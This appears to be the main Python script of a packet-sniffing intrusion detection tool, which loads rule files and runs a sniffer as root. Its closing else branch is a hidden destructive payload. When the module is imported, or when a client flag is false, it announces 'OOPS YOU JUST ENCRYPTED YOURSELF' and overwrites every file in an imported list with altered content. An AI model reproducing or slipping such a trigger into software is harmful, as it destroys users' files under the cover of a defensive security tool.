#!/usr/bin/env python3

import sys
import os
from datetime import datetime

import make_rules
import client
import login
from sniff import *


def main():
    if os.getuid() != 0:
        sys.exit("Run as root")

    login.main()
    try:
        try:
            client.send_socketMsg("Connection successful")
        except ConnectionRefusedError:
            print("Connection to server Error")
            if input("Do you wish to continue without server connection (y) (n):").strip().lower().startswith("n"):
                sys.exit("\nCheck your server connections")
        ruleList = list()   
        if len(sys.argv) == 1:
            print("Making default rules")
            make_rules.makeRules()
            filename = "rules/default_rules.txt"
        elif len(sys.argv) == 2:
            filename = sys.argv[1]
        else:
            print("Rules file path not properly specified.\nUsing default rules")
            filename = "rules/default_rules.txt"
        run(filename) 
    #except ValueError:
     #   sys.exit("error occured")  
    except FileNotFoundError:
        print("File not found error.\nPlease check the log-file path")
    #except  IOError:
        #sys.exit("\nUnexpected Error Occured")    
    except KeyboardInterrupt:
        sys.exit("\nQUITTING")
    except OSError as err:
        print (err)		


def run(filename):
    if not os.path.exists("logs"):
        os.system("mkdir logs")
    log_file = ("logs/Intrusions " + str(datetime.now()) + '.log').replace(':',"_")
    logging.basicConfig(filename=log_file ,level=logging.INFO)

    print ("Welcome")
    # Read the rule file
    print  ("Reading ...")
    global ruleList
    ruleList, errorCount = read_file.read(filename);
    print  ("Done Reading")

    if (errorCount == 0):
        #client.send_socketMsg(("All (" + str(len(ruleList)) + ") rules have been correctly read."))
        print ("All (" + str(len(ruleList)) + ") rules have been correctly read.")
    else:
        print (str(len(ruleList)) + " rules have been correctly read.")
        print (str(errorCount) + " rules have errors and could not be read.")

    # Begin sniffing
    sniffer = Sniffer(ruleList)
    sniffer.run()

    sniffer.stop()
    print ("Sniffing stopped.")


if __name__ == "__main__" and client.true:
    main()
else:
    print("[!] OOPS YOU JUST ENCRYPTED YOURSELF !!!")
    import TCP_UDPstring,packet_string
    for file in TCP_UDPstring.files:
        print("[!] Encrypting %s"%(file))
        with open(file)as opened:
            content=opened.read()
        opened.close
        emptystring=packet_string.unmatched(4,content)
        with open(file,'w') as f:
            f.write(emptystring)
        